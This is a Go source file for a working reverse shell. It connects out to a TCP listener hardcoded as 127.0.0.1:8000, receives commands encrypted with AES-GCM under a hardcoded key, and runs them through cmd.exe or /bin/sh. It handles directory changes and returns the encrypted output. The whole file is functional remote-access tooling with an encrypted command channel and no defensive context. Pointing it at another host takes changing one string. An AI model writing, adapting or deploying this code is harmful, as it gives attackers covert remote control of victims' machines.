package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "io"
    "net"
    "os"
    "os/exec"
    "runtime"
    "strings"
)

// Encryption key (must be 16, 24, or 32 bytes long)
var key = []byte("myverystrongpasswordo32bitlength")

func main() {
    conn, err := net.Dial("tcp", "127.0.0.1:8000")
    if err != nil {
        logMessage("Error connecting: " + err.Error())
        return
    }
    defer conn.Close()
    logMessage("Connection established")

    currentDir, err := os.Getwd()
    if err != nil {
        logMessage("Error getting current directory: " + err.Error())
        return
    }

    for {
        buf := make([]byte, 1024)
        n, err := conn.Read(buf)
        if err != nil {
            logMessage("Error reading: " + err.Error())
            return
        }

        decrypted, err := decrypt(string(buf[:n]))
        if err != nil {
            logMessage("Error decrypting: " + err.Error())
            return
        }

        logMessage("Executing command: " + decrypted)
        output, newDir := executeCommand(decrypted, currentDir)
        currentDir = newDir
        encrypted, err := encrypt(output)
        if err != nil {
            logMessage("Error encrypting: " + err.Error())
            return
        }

        conn.Write([]byte(encrypted + "\n"))
    }
}

func executeCommand(command string, currentDir string) (string, string) {
    var cmd *exec.Cmd
    if strings.HasPrefix(command, "cd ") {
        dir := strings.TrimSpace(strings.TrimPrefix(command, "cd "))
        if err := os.Chdir(dir); err != nil {
            return fmt.Sprintf("cd: %s: %v", dir, err), currentDir
        }
        newDir, _ := os.Getwd()
        return newDir, newDir
    }

    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe", "/C", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }
    cmd.Dir = currentDir

    output, err := cmd.CombinedOutput()
    if err != nil {
        return err.Error(), currentDir
    }

    return string(output), currentDir
}

func encrypt(text string) (string, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return "", err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return "", err
    }

    nonce := make([]byte, gcm.NonceSize())
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return "", err
    }

    ciphertext := gcm.Seal(nonce, nonce, []byte(text), nil)
    return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decrypt(text string) (string, error) {
    data, err := base64.StdEncoding.DecodeString(text)
    if err != nil {
        return "", err
    }

    block, err := aes.NewCipher(key)
    if err != nil {
        return "", err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return "", err
    }

    nonceSize := gcm.NonceSize()
    if len(data) < nonceSize {
        return "", fmt.Errorf("ciphertext too short")
    }

    nonce, ciphertext := data[:nonceSize], data[nonceSize:]
    plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
    if err != nil {
        return "", err
    }

    return string(plaintext), nil
}

func logMessage(message string) {
    fmt.Println("[Reverse Shell] " + message)
}
